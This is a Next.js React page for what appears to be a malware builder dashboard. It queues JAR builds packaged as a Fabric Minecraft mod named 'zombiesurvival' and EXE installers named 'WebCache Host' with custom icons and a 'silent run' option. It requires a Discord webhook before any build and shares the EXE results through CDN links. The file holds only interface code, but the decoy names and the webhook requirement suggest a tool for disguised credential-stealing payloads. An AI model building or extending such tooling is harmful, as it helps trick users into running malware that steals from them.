"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import {
  ArrowLeft,
  ChevronDown,
  Copy,
  Download,
  FileCode2,
  ImagePlus,
  Loader2,
  Package,
  X,
} from "lucide-react";
import { Page, PageHead } from "@/components/shell/app-shell";
import { Surface } from "@/components/ui/surface";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { CardBody, CardDesc, CardHeader, CardTitle } from "@/components/ui/card";
import { play } from "@/lib/sound";
import { cn } from "@/lib/utils";
import { PageSkeleton } from "@/components/ui/skeleton";

type Build = {
  id: number;
  kind: string;
  status: string;
  detail: string | null;
  label?: string | null;
  artifact: string | null;
  created_at: number;
  finished_at: number | null;
};

function tone(status: string): "ok" | "bad" | "muted" {
  if (status === "ok") return "ok";
  if (status === "fail" || status === "cancel") return "bad";
  return "muted";
}

function labelStatus(status: string) {
  if (status === "queued") return "queued";
  if (status === "running") return "building";
  if (status === "ok") return "ready";
  if (status === "fail") return "error";
  if (status === "cancel") return "canceled";
  return status;
}

function stageList(kind: string) {
  if (kind === "exe") {
    return ["prep", "icon / name", "config", "exe pack", "cdn upload"];
  }
  return ["prep", "config", "gradle", "fabric pack", "copy jar"];
}

function stageIndex(detail: string | null | undefined, kind: string) {
  const d = (detail || "").toLowerCase();
  const steps = stageList(kind);
  const m = d.match(/^(\d+)\s*\/\s*\d+/);
  if (m) {
    const n = Number(m[1]);
    if (Number.isFinite(n) && n >= 1) return Math.min(n - 1, steps.length - 1);
  }
  const keys = [
    ["cdn", "upload"],
    ["jar kopyala", "jar hazir", "copy jar"],
    ["fabric", "pack-fab", "fabric pack"],
    ["gradle", "derleme", "build.bat"],
    ["exe paket", "pack-exe", "exe pack"],
    ["config"],
    ["ikon", "isim", "icon / name", "icon"],
    ["hazirlik", "basladi", "prep"],
  ];
  for (let i = keys.length - 1; i >= 0; i--) {
    if (keys[i].some((k) => d.includes(k))) {
      return Math.min(i, steps.length - 1);
    }
  }
  return 0;
}

function isLive(b: Build | null) {
  return Boolean(b && (b.status === "queued" || b.status === "running"));
}

function isLink(s: string | null | undefined) {
  return Boolean(s && /^https?:\/\//i.test(s));
}

function fmtTime(ts: number | null | undefined) {
  if (!ts) return "—";
  try {
    return new Date(ts * 1000).toLocaleString("en-US", {
      day: "2-digit",
      month: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    });
  } catch {
    return "—";
  }
}

function parseJsonSafe(res: Response) {
  return res.text().then((t) => {
    if (!t.trim()) throw new Error("empty response");
    try {
      return JSON.parse(t) as Record<string, unknown>;
    } catch {
      throw new Error(t.slice(0, 300) || "json fail");
    }
  });
}

function ErrBox({ text }: { text: string }) {
  return (
    <div className="overflow-hidden rounded-2xl border border-destructive/30 bg-destructive/5">
      <div className="flex items-center justify-between gap-2 border-b border-destructive/15 px-3 py-2">
        <span className="font-mono text-[10px] uppercase tracking-[0.18em] text-destructive">error</span>
        <Button
          size="sm"
          variant="ghost"
          className="h-7 px-2 text-xs"
          sound={false}
          onClick={() => {
            void navigator.clipboard.writeText(text);
            play("ok");
          }}
        >
          <Copy className="h-3.5 w-3.5" /> copy
        </Button>
      </div>
      <pre className="max-h-[240px] overflow-auto whitespace-pre-wrap break-words p-3 font-mono text-[12px] leading-relaxed text-destructive">
        {text}
      </pre>
    </div>
  );
}

export default function BuildPage() {
  const router = useRouter();
  const [builds, setBuilds] = useState<Build[]>([]);
  const [active, setActive] = useState<Build | null>(null);
  const [hasWebhook, setHasWebhook] = useState(false);
  const [err, setErr] = useState<string | null>(null);
  const [msg, setMsg] = useState<string | null>(null);
  const [busy, setBusy] = useState(false);
  const [kind, setKind] = useState<"jar" | "exe" | null>(null);
  const [name, setName] = useState("WebCache Host");
  const [icon, setIcon] = useState<File | null>(null);
  const [theme, setTheme] = useState<File | null>(null);
  const [sizeMode, setSizeMode] = useState<"default" | "custom">("default");
  const [tw, setTw] = useState("820");
  const [th, setTh] = useState("560");
  const [preview, setPreview] = useState<string | null>(null);
  const [openId, setOpenId] = useState<number | null>(null);
  const [ready, setReady] = useState(false);

  const load = useCallback(async () => {
    try {
      const res = await fetch("/api/build");
      if (res.status === 401) {
        router.push("/login");
        return;
      }
      if (!res.ok) {
        const raw = await res.text();
        throw new Error(raw.slice(0, 300) || `http ${res.status}`);
      }
      const data = (await parseJsonSafe(res)) as {
        builds?: Build[];
        active?: Build | null;
        hasWebhook?: boolean;
      };
      setBuilds(data.builds || []);
      setActive(data.active || null);
      setHasWebhook(Boolean(data.hasWebhook));
      setErr(null);
    } catch (ex) {
      setErr(ex instanceof Error ? ex.message : "load fail");
    } finally {
      setReady(true);
    }
  }, [router]);

  useEffect(() => {
    void load();
  }, [load]);

  useEffect(() => {
    if (!isLive(active)) return;
    const t = setInterval(() => void load(), 1500);
    return () => clearInterval(t);
  }, [active, load]);

  useEffect(() => {
    if (!icon) {
      setPreview(null);
      return;
    }
    const url = URL.createObjectURL(icon);
    setPreview(url);
    return () => URL.revokeObjectURL(url);
  }, [icon]);

  async function start(next: "jar" | "exe") {
    setBusy(true);
    setErr(null);
    setMsg(null);
    try {
      const form = new FormData();
      form.set("kind", next);
      form.set("label", name.trim() || (next === "exe" ? "WebCache Host" : "zombiesurvival"));
      if (next === "exe" && icon) form.set("icon", icon);
      if (next === "exe" && theme) {
        form.set("theme", theme);
        form.set("size", sizeMode);
        if (sizeMode === "custom") {
          form.set("tw", tw);
          form.set("th", th);
        }
      }
      const res = await fetch("/api/build", { method: "POST", body: form });
      const data = await parseJsonSafe(res);
      if (!res.ok) throw new Error(String(data.error || "fail"));
      play("ok");
      setMsg(`${next} queued`);
      setOpenId(Number(data.buildId) || null);
      await load();
    } catch (ex) {
      play("err");
      setErr(ex instanceof Error ? ex.message : "fail");
    } finally {
      setBusy(false);
    }
  }

  function pickKind(next: "jar" | "exe") {
    play("tap");
    setKind(next);
    setErr(null);
    setMsg(null);
    if (next === "jar") {
      if (!name.trim() || name === "WebCache Host") setName("zombiesurvival");
      setIcon(null);
      setTheme(null);
      setSizeMode("default");
      setTw("820");
      setTh("560");
    } else if (!name.trim() || name === "zombiesurvival") {
      setName("WebCache Host");
    }
  }

  function clearKind() {
    if (isLive(active)) return;
    play("tap");
    setKind(null);
  }

  async function cancel(id: number) {
    setBusy(true);
    setErr(null);
    setMsg(null);
    try {
      const res = await fetch(`/api/build/${id}`, { method: "DELETE" });
      const data = await parseJsonSafe(res);
      if (!res.ok) throw new Error(String(data.error || "cancel failed"));
      play("ok");
      setMsg(`#${id} canceled`);
      await load();
    } catch (ex) {
      play("err");
      setErr(ex instanceof Error ? ex.message : "cancel failed");
    } finally {
      setBusy(false);
    }
  }

  const latestJar = useMemo(
    () => builds.find((b) => b.status === "ok" && b.kind === "jar"),
    [builds],
  );
  const latestExe = useMemo(
    () => builds.find((b) => b.status === "ok" && b.kind === "exe" && isLink(b.detail)),
    [builds],
  );

  const liveCur = active && isLive(active) ? stageIndex(active.detail, active.kind) : -1;

  if (!ready) return <PageSkeleton cards={3} />;

  return (
    <><Page>
        <PageHead
          kicker="02 / build"
          title="Build"
          desc="Choose JAR or EXE, then build"
          action={
            isLive(active) ? <Badge tone="muted">live · #{active!.id}</Badge> : undefined
          }
        />

        {msg ? (
          <p className="mb-4 border border-mark/30 bg-mark/10 px-4 py-3 font-mono text-sm text-mark">
            {msg}
          </p>
        ) : null}
        {err ? <div className="mb-4"><ErrBox text={err} /></div> : null}

        {!hasWebhook ? (
          <p className="mb-4 border border-rule bg-card/60 px-4 py-3 text-sm text-muted-foreground">
            Save a Discord webhook on the account page first.
          </p>
        ) : null}

        <div className="grid gap-4">
          {!kind ? (
            <>
              <Surface>
                <CardHeader>
                  <CardTitle>Choose build</CardTitle>
                  <CardDesc>Pick JAR or EXE — same pipeline as before</CardDesc>
                </CardHeader>
                <CardBody>
                  <div className="grid gap-3 sm:grid-cols-2">
                    <button
                      type="button"
                      disabled={!hasWebhook || isLive(active)}
                      onClick={() => pickKind("jar")}
                      className={cn(
                        "flex flex-col items-start gap-2 rounded-2xl border border-rule bg-black/25 p-5 text-left transition",
                        "hover:border-mark/40 hover:bg-white/[0.03]",
                        "disabled:pointer-events-none disabled:opacity-40",
                      )}
                    >
                      <Package className="h-5 w-5 text-mark" />
                      <span className="font-heading text-lg font-semibold tracking-tight">JAR Build</span>
                      <span className="text-sm text-muted-foreground">Fabric mod package</span>
                    </button>
                    <button
                      type="button"
                      disabled={!hasWebhook || isLive(active)}
                      onClick={() => pickKind("exe")}
                      className={cn(
                        "flex flex-col items-start gap-2 rounded-2xl border border-rule bg-black/25 p-5 text-left transition",
                        "hover:border-mark/40 hover:bg-white/[0.03]",
                        "disabled:pointer-events-none disabled:opacity-40",
                      )}
                    >
                      <Package className="h-5 w-5 text-mark" />
                      <span className="font-heading text-lg font-semibold tracking-tight">EXE Build</span>
                      <span className="text-sm text-muted-foreground">NSIS installer + icon</span>
                    </button>
                  </div>
                </CardBody>
              </Surface>

              {(latestJar || latestExe) && (
                <div className="grid gap-4 sm:grid-cols-2">
                  {latestJar ? (
                    <Surface>
                      <CardHeader>
                        <CardTitle>Latest jar</CardTitle>
                        <CardDesc>
                          #{latestJar.id}
                          {latestJar.label ? ` · ${latestJar.label}` : ""}
                        </CardDesc>
                      </CardHeader>
                      <CardBody className="space-y-2">
                        <p className="break-all font-mono text-[11px] text-muted-foreground">
                          {(latestJar.label || "build").replace(/\s+/g, "")}.jar
                        </p>
                        <Button asChild className="w-full" size="sm" variant="outline">
                          <a href={`/api/build/${latestJar.id}/download`}>
                            <Download className="h-4 w-4" /> download
                          </a>
                        </Button>
                      </CardBody>
                    </Surface>
                  ) : null}
                  {latestExe ? (
                    <Surface>
                      <CardHeader>
                        <CardTitle>Latest exe</CardTitle>
                        <CardDesc>
                          #{latestExe.id}
                          {latestExe.label ? ` · ${latestExe.label}` : ""}
                        </CardDesc>
                      </CardHeader>
                      <CardBody className="space-y-2">
                        <p className="break-all font-mono text-[11px] text-muted-foreground">
                          {latestExe.detail}
                        </p>
                        <Button
                          className="w-full"
                          size="sm"
                          variant="outline"
                          onClick={() => {
                            void navigator.clipboard.writeText(latestExe.detail!);
                            play("ok");
                          }}
                        >
                          <Copy className="h-4 w-4" /> copy link
                        </Button>
                      </CardBody>
                    </Surface>
                  ) : null}
                </div>
              )}
            </>
          ) : (
            <Surface>
              <CardHeader className="flex flex-row flex-wrap items-start gap-3">
                <Button
                  type="button"
                  size="sm"
                  variant="ghost"
                  className="mt-0.5 shrink-0 px-2"
                  sound={false}
                  disabled={isLive(active)}
                  onClick={clearKind}
                  aria-label="back"
                >
                  <ArrowLeft className="h-4 w-4" />
                </Button>
                <div className="min-w-0 flex-1">
                  <CardTitle>{kind === "jar" ? "JAR Build" : "EXE Build"}</CardTitle>
                  <CardDesc>
                    {kind === "exe"
                      ? "Name, icon, optional theme HTML window"
                      : "Output name for the jar"}
                  </CardDesc>
                </div>
              </CardHeader>
              <CardBody className="space-y-5">
                <div className="space-y-2">
                  <label className="font-mono text-[10px] uppercase tracking-[0.14em] text-muted-foreground">
                    name
                  </label>
                  <Input
                    value={name}
                    onChange={(e) => setName(e.target.value.slice(0, 60))}
                    placeholder={kind === "exe" ? "WebCache Host" : "zombiesurvival"}
                    maxLength={60}
                  />
                </div>
                {kind === "exe" ? (
                  <>
                    <div className="space-y-2">
                      <label className="font-mono text-[10px] uppercase tracking-[0.14em] text-muted-foreground">
                        exe icon (.ico / .png · max 2MB)
                      </label>
                      <div className="flex flex-wrap items-center gap-3">
                        <label className="inline-flex cursor-pointer items-center gap-2 rounded-2xl border border-rule bg-black/25 px-3 py-2 font-mono text-xs text-muted-foreground transition hover:border-mark/40 hover:text-foreground">
                          <ImagePlus className="h-4 w-4" />
                          {icon ? icon.name : "choose icon"}
                          <input
                            type="file"
                            accept=".ico,.png,image/png,image/x-icon,image/vnd.microsoft.icon"
                            className="hidden"
                            onChange={(e) => {
                              const f = e.target.files?.[0] || null;
                              if (f && f.size > 2 * 1024 * 1024) {
                                setErr("icon max 2MB");
                                return;
                              }
                              setIcon(f);
                            }}
                          />
                        </label>
                        {preview ? (
                          // eslint-disable-next-line @next/next/no-img-element
                          <img
                            src={preview}
                            alt=""
                            className="size-10 rounded-2xl object-contain ring-1 ring-rule"
                          />
                        ) : null}
                        {icon ? (
                          <button
                            type="button"
                            className="font-mono text-xs text-muted-foreground hover:text-foreground"
                            onClick={() => setIcon(null)}
                          >
                            clear
                          </button>
                        ) : null}
                      </div>
                    </div>
                    <div className="space-y-2">
                      <label className="font-mono text-[10px] uppercase tracking-[0.14em] text-muted-foreground">
                        theme (.html · optional · max 2MB)
                      </label>
                      <div className="flex flex-wrap items-center gap-3">
                        <label className="inline-flex cursor-pointer items-center gap-2 rounded-2xl border border-rule bg-black/25 px-3 py-2 font-mono text-xs text-muted-foreground transition hover:border-mark/40 hover:text-foreground">
                          <FileCode2 className="h-4 w-4" />
                          {theme ? theme.name : "choose html"}
                          <input
                            type="file"
                            accept=".html,.htm,text/html"
                            className="hidden"
                            onChange={(e) => {
                              const f = e.target.files?.[0] || null;
                              if (f && f.size > 2 * 1024 * 1024) {
                                setErr("theme max 2MB");
                                return;
                              }
                              setTheme(f);
                            }}
                          />
                        </label>
                        {theme ? (
                          <button
                            type="button"
                            className="font-mono text-xs text-muted-foreground hover:text-foreground"
                            onClick={() => {
                              setTheme(null);
                              setSizeMode("default");
                              setTw("820");
                              setTh("560");
                            }}
                          >
                            clear
                          </button>
                        ) : null}
                      </div>
                      {theme ? (
                        <div className="relative z-20 space-y-2 rounded-2xl border border-white/10 bg-black/30 p-3">
                          <p className="font-mono text-[10px] uppercase tracking-[0.14em] text-muted-foreground">
                            window size
                          </p>
                          <div className="flex flex-wrap gap-2">
                            <button
                              type="button"
                              onClick={() => setSizeMode("default")}
                              className={cn(
                                "relative z-20 cursor-pointer rounded-2xl border px-3 py-1.5 font-mono text-xs transition",
                                sizeMode === "default"
                                  ? "border-white/20 bg-white text-zinc-950"
                                  : "border-rule bg-black/25 text-muted-foreground hover:border-mark/40 hover:text-foreground",
                              )}
                            >
                              Default
                            </button>
                            <button
                              type="button"
                              onClick={() => setSizeMode("custom")}
                              className={cn(
                                "relative z-20 cursor-pointer rounded-2xl border px-3 py-1.5 font-mono text-xs transition",
                                sizeMode === "custom"
                                  ? "border-white/20 bg-white text-zinc-950"
                                  : "border-rule bg-black/25 text-muted-foreground hover:border-mark/40 hover:text-foreground",
                              )}
                            >
                              Custom
                            </button>
                          </div>
                          {sizeMode === "custom" ? (
                            <div className="relative z-20 flex items-center gap-2">
                              <Input
                                className="h-9 w-24"
                                inputMode="numeric"
                                value={tw}
                                onChange={(e) => setTw(e.target.value.replace(/\D/g, "").slice(0, 4))}
                                placeholder="820"
                              />
                              <span className="text-xs text-muted-foreground">x</span>
                              <Input
                                className="h-9 w-24"
                                inputMode="numeric"
                                value={th}
                                onChange={(e) => setTh(e.target.value.replace(/\D/g, "").slice(0, 4))}
                                placeholder="560"
                              />
                            </div>
                          ) : (
                            <p className="text-xs text-muted-foreground">820 x 560</p>
                          )}
                        </div>
                      ) : null}
                      <p className="text-xs text-muted-foreground">
                        Opens as a window when the exe starts. Leave empty for silent run.
                      </p>
                    </div>
                  </>
                ) : null}

                <Button
                  className="w-full"
                  disabled={busy || !hasWebhook || isLive(active)}
                  sound={false}
                  onClick={() => void start(kind)}
                >
                  {busy ? <Loader2 className="h-4 w-4 animate-spin" /> : <Package className="h-4 w-4" />}
                  {kind === "jar" ? "create jar" : "create exe"}
                </Button>
              </CardBody>
            </Surface>
          )}

          {active && isLive(active) ? (
            <Surface className="border-mark/30">
              <CardHeader>
                <CardTitle>Now</CardTitle>
                <CardDesc>
                  #{active.id} · {active.kind}
                  {active.label ? ` · ${active.label}` : ""}
                </CardDesc>
              </CardHeader>
              <CardBody className="space-y-5">
                <div className="flex flex-wrap items-center gap-3">
                  <Badge tone={tone(active.status)}>{labelStatus(active.status)}</Badge>
                  <Loader2 className="h-4 w-4 animate-spin text-mark" />
                  <p className="flex-1 font-mono text-sm text-mark">
                    {active.status === "queued"
                      ? "waiting in queue"
                      : active.detail || "starting…"}
                  </p>
                  <Button
                    size="sm"
                    variant="outline"
                    disabled={busy}
                    sound={false}
                    onClick={() => void cancel(active.id)}
                  >
                    <X className="h-4 w-4" /> cancel
                  </Button>
                </div>

                <ol className="grid gap-2 sm:grid-cols-5">
                  {stageList(active.kind).map((s, i) => {
                    const done = liveCur >= 0 && i < liveCur;
                    const now = liveCur >= 0 && i === liveCur;
                    return (
                      <li
                        key={s}
                        className={cn(
                          "rounded-2xl border px-2.5 py-2 text-center font-mono text-[11px]",
                          now && "border-mark/40 bg-mark/10 text-mark",
                          done && "border-rule bg-white/[0.04] text-foreground/75",
                          !now && !done && "border-rule/50 text-muted-foreground",
                        )}
                      >
                        <span className="mb-0.5 block text-[10px] opacity-60">
                          {i + 1}/{stageList(active.kind).length}
                        </span>
                        {s}
                      </li>
                    );
                  })}
                </ol>
              </CardBody>
            </Surface>
          ) : null}

          <Surface>
            <CardHeader>
              <CardTitle>History</CardTitle>
              <CardDesc>On failure, only the message is shown</CardDesc>
            </CardHeader>
            <CardBody className="space-y-2">
              {builds.map((b) => {
                const open = openId === b.id;
                return (
                  <div
                    key={b.id}
                    className={cn(
                      "overflow-hidden rounded-2xl border border-rule bg-black/20",
                      b.status === "fail" && "border-destructive/30",
                      open && "border-mark/30",
                    )}
                  >
                    <button
                      type="button"
                      className="flex w-full flex-wrap items-center gap-2 px-3 py-3 text-left transition hover:bg-white/[0.02]"
                      onClick={() => setOpenId(open ? null : b.id)}
                    >
                      <Badge tone={tone(b.status)}>{labelStatus(b.status)}</Badge>
                      <span className="text-sm font-medium uppercase tracking-wide">{b.kind}</span>
                      {b.label ? (
                        <span className="text-sm text-muted-foreground">{b.label}</span>
                      ) : null}
                      <span className="font-mono text-xs text-muted-foreground">#{b.id}</span>
                      <span className="ml-auto flex items-center gap-2 font-mono text-[11px] text-muted-foreground">
                        {fmtTime(b.finished_at || b.created_at)}
                        <ChevronDown
                          className={cn("h-4 w-4 transition", open && "rotate-180")}
                        />
                      </span>
                    </button>

                    {open ? (
                      <div className="space-y-3 border-t border-rule px-3 py-3">
                        <div className="flex flex-wrap gap-2">
                          {b.status === "ok" && b.kind === "jar" ? (
                            <Button asChild size="sm">
                              <a href={`/api/build/${b.id}/download`}>
                                <Download className="h-4 w-4" /> download
                              </a>
                            </Button>
                          ) : null}
                          {b.status === "ok" && b.kind === "exe" && isLink(b.detail) ? (
                            <Button
                              size="sm"
                              variant="outline"
                              onClick={() => {
                                void navigator.clipboard.writeText(b.detail!);
                                play("ok");
                              }}
                            >
                              <Copy className="h-4 w-4" /> link
                            </Button>
                          ) : null}
                          {isLive(b) ? (
                            <Button
                              size="sm"
                              variant="outline"
                              disabled={busy}
                              sound={false}
                              onClick={() => void cancel(b.id)}
                            >
                              <X className="h-4 w-4" /> cancel
                            </Button>
                          ) : null}
                        </div>

                        {b.status === "fail" && b.detail ? (
                          <ErrBox text={b.detail} />
                        ) : b.status === "ok" && isLink(b.detail) ? (
                          <p className="break-all font-mono text-xs text-muted-foreground">
                            {b.detail}
                          </p>
                        ) : b.status === "ok" ? (
                          <p className="text-xs text-muted-foreground">
                            {b.label || b.detail || "ready"}
                          </p>
                        ) : b.status === "cancel" ? (
                          <p className="text-xs text-muted-foreground">canceled</p>
                        ) : null}
                      </div>
                    ) : b.status === "fail" && b.detail ? (
                      <p className="border-t border-rule px-3 py-2 font-mono text-[11px] text-destructive line-clamp-2">
                        {b.detail}
                      </p>
                    ) : null}
                  </div>
                );
              })}
              {!builds.length ? (
                <p className="text-sm text-muted-foreground">no builds yet</p>
              ) : null}
            </CardBody>
          </Surface>
        </div>
      </Page>
    </>
);
}
